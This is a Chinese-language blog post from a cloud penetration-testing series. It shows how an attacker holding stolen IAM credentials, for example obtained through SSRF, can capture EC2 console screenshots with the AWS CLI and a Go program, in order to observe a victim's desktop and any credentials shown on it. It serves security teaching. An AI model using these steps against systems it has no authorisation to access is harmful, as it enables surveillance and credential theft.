---
author: Sunny Tsai
title: "[Day 25] 天堂雲端 - EC2 桌面截圖（screenshot）"
date: 2023-10-08
math: true
tags: [
    "aws",
    "ec2",
    "screenshot"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
# 桌面截圖
在滲透測試中，桌面截圖是一種獲得額外信息或增加攻擊者瞭解目標環境的重要手段
* 環境的實時視圖
    * 運行的應用程序、開放的文件、使用中的工具
* 行為模式
    * 通過定期截圖，攻擊者可以建立一個用戶的行為模式，了解最佳的攻擊時機。
* 身份驗證資訊 or 敏感訊息洩漏
    * 使用者可能在他們的桌面上放置了敏感的文件或便箋，或是被擷取到像Outlook或其他通信工具的登錄窗口

# AWS Cli
前提：要取得iam credential憑證（可以用SSRF等手段取得）
[get-console-screenshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/get-console-screenshot.html)
```
> aws ec2 get-console-screenshot --instance-id {EC2_INSTANCE_ID} --output text
```

Output:
```
image bytes
```


# Code
前提：要取得iam credential憑證（可以用SSRF等手段取得）
```
package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"os"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
)

func main() {
	// AWS Session
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String("XXXXXXXX"),
		Credentials: credentials.NewStaticCredentials("XXX", "XXXXXXXXXX", ""),
	})

	if err != nil {
		fmt.Println("Error creating session:", err)
		return
	}

	// EC2 Service Client
	svc := ec2.New(sess)

	// EC2 instance ID
	instanceID := "X-XXXXXXXXXXXXX"

	// Get console screenshot
	input := &ec2.GetConsoleScreenshotInput{
		InstanceId: aws.String(instanceID),
	}

	// Get screenshot result
	result, err := svc.GetConsoleScreenshot(input)
	if err != nil {
		fmt.Println("Error getting console screenshot:", err)
		return
	}

	// Decode screenshot
	imageData := *result.ImageData
	imgBytes, err := base64.StdEncoding.DecodeString(imageData)
	if err != nil {
		fmt.Println("Error decoding image data:", err)
		return
	}

	// Build image buffer
	imgBuf := bytes.NewReader(imgBytes)

	// Decode image
	img, err := jpeg.Decode(imgBuf)
	if err != nil {
		fmt.Println("Error decoding image:", err)
		return
	}

	// Build image file
	imgFile, err := os.Create("screenshot.jpg")
	if err != nil {
		fmt.Println("Error creating image file:", err)
		return
	}
	defer imgFile.Close()

	// Encode image to file
	jpeg.Encode(imgFile, img, nil)

	fmt.Println("Screenshot saved as screenshot.png")
}
```
